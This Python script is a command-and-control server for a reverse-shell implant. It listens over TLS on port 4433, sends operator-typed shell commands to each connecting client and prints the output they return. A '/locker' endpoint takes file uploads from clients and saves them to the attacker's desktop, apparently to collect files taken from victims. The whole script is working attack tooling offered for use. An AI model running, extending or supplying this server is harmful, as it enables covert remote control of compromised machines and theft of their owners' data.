#!/usr/bin/python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl
import time
import cgi

HOST_NAME = '0.0.0.0'
PORT = 4433


class Server(BaseHTTPRequestHandler):

    def do_GET(self):
        command = input(f"[#] Shell {self.client_address[0]} > ")
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(command.encode())

    def do_POST(self):
        if self.path == '/locker':
            try:
                ctype, pdict = cgi.parse_header(self.headers.get('content-type'))
                if ctype == 'multipart/form-data':
                    fs = cgi.FieldStorage(fp=self.rfile,
                                          headers=self.headers,
                                          environ={'REQUEST_METHOD': 'POST'}
                                          )
                else:
                    print("[X] Unexpected POST request")

                fs_upload = fs['file']

                with open('/root/Desktop/1.txt', 'wb') as o:
                    o.write(fs_upload.file.read())
                    self.send_response(200)
                    self.end_headers()
            except Exception as e:
                print(e)

            return

        self.send_response(200)
        self.end_headers()
        length = int(self.headers['Content-Length'])
        command_output = self.rfile.read(length).decode()
        print(command_output)


if __name__ == '__main__':
    httpd = HTTPServer((HOST_NAME, PORT), Server)
    httpd.socket = ssl.wrap_socket(httpd.socket, certfile='selfsigned.pem', keyfile='private.pem')

    try:
        print(f'[+] {time.asctime()} Server is RUNNING! - {HOST_NAME}:{PORT}')
        httpd.serve_forever()
    except KeyboardInterrupt:
        httpd.server_close()
        print(f'[x] {time.asctime()} Server is DOWN! - {HOST_NAME}:{PORT}')
